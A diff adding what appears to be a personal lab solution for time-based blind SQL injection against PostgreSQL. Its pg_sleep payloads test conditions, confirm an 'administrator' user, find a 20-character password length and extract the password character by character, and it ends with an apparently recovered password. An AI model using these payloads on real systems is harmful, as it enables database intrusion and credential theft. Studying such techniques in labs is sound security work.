@@ -1,0 +1,16 @@
+
+' || pg_sleep(5)--
+
+' || (select case when (1=0) then pg_sleep(5) else pg_sleep(-1) end)--
+' || (select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end)--
+
+' || (select case when (username='administrator') then pg_sleep(5) else pg_sleep(-1) end from users)--
+
+' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(5) else pg_sleep(-1) end from users)--
+-> length of password is 20 characters
+
+' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(-1) end from users)--
+
+13ipnob7l2dkjp3drryy
+
+
